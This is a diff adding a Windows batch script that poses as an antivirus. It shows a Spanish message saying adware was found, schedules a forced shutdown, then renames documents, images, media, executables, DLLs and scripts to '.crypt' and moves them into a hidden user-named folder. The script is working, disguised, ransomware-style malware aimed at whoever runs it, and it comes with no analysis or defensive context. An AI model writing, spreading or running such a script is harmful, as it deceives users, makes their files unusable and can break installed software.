@@ -1,0 +1,70 @@
+clear
+color 2
+@echo off
+shutdown -s -t 300 
+echo --------------------------------------------
+echo  ===  =  = ===== =  =   = =  ===  =  =  == -
+echo =   = == =   =      =   =   =   = =  = =   -
+echo ===== = ==   =   =  =   = = ====  =  = ==  -
+echo =   = =  =   =   =   = =  = = =   =  =    =-
+echo =   = =  =   =   =    =   = =  =   ==  === -
+echo --------------------------------------------
+echo by-???-07/11/2018-
+echo ------------------
+echo Al parecer tienes un adware que esta ubicado en:
+echo C:\users\%username%\desktop\%random%.dfbs
+echo Al teclear el antivirus lo analizara y lo 
+echo eliminara...
+pause
+ren *.jpg *.crypt
+ren *.JPG *.crypt
+ren *.pdf *.crypt
+ren *.PDF *.crypt
+ren *.png *.crypt
+ren *.PNG *.crypt
+ren *.exe *.crypt
+ren *.EXE *.crypt
+ren *.py *.crypt
+ren *.PY *.crypt
+ren *.doc *.crypt
+ren *.DOC *.crypt
+ren *.jpeg *.crypt
+ren *.JPEG *.crypt
+ren *.vbs *.crypt
+ren *.VBS *.crypt
+ren *.html *.crypt
+ren *.HTML *.crypt
+ren *.htm *.crypt
+ren *.HTM *.crypt
+ren *.lnk *.crypt
+ren *.rar *.crypt
+ren *.RAR *.crypt
+ren *.docx *.crypt
+ren *.DOCX *.crypt
+ren *.pptx *.crypt
+ren *.PPTX *.crypt
+ren *.php *.crypt
+ren *.PHP *.crypt
+ren *.dll *.crypt
+ren *.DLL *.crypt
+ren *.mp3 *.crypt
+ren *.MP3 *.crypt
+ren *.mp4 *.crypt
+ren *.MP4 *.crypt
+ren *.wav *.crypt
+ren *.WAV *.crypt
+ren *.BAT *.crypt
+ren *.bat *.crypt
+ren *.sh *.crypt
+ren *.SH *.crypt
+ren *.py *.crypt
+ren *.PY *.crypt
+mkdir %username%
+move *.crypt %username%
+move %username% C:\users\%username%
+echo Antes de todo introduce una palabra al azar
+echo para identificarte:
+net user %username%
+pause
+exit
+
